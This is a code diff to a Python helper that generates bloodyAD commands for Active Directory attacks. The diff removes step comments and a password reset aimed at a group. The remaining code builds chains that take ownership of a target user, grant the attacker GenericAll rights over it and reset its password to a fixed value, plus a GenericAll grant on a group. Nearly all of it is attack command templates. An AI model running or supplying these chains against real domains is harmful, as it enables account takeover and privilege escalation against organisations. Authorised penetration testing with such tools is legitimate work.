@@ -11,15 +11,12 @@ def generate_bloodyAD_command(choice, **kwargs):
         return f"bloodyAD --host {kwargs['dc']} -d {kwargs['domain']} -u {kwargs['username']} -p {kwargs['password']} add genericAll {kwargs['DN']} {kwargs['target_username']}"
     elif choice == "5_user":
         commands = []
-        # Step 1: WriteOwner
         commands.append(
             f"bloodyAD --host {kwargs['dc']} -d {kwargs['domain']} -u {kwargs['username']} -p {kwargs['password']} set owner {kwargs['target_user']} {kwargs['username']}"
         )
-        # Step 2: GenericAll
         commands.append(
             f"bloodyAD --host {kwargs['dc']} -d {kwargs['domain']} -u {kwargs['username']} -p {kwargs['password']} add genericAll {kwargs['target_user']} {kwargs['username']}"
         )
-        # Step 3: Change Password
         commands.append(
             f"bloodyAD --host {kwargs['dc']} -d {kwargs['domain']} -u {kwargs['username']} -p {kwargs['password']} set password {kwargs['target_user']} NewStrongPassword123!"
         )
@@ -43,9 +40,6 @@ def generate_bloodyAD_command(choice, **kwargs):
         )
         commands.append(
             f"bloodyAD --host {kwargs['dc']} -d {kwargs['domain']} -u {kwargs['username']} -p {kwargs['password']} add genericAll {kwargs['target_group']} {kwargs['username']}"
-        )
-        commands.append(
-            f"bloodyAD --host {kwargs['dc']} -d {kwargs['domain']} -u {kwargs['username']} -p {kwargs['password']} set password {kwargs['target_group']} NewStrongPassword123!"
         )
         return "\n".join(commands)
     elif choice == "6":
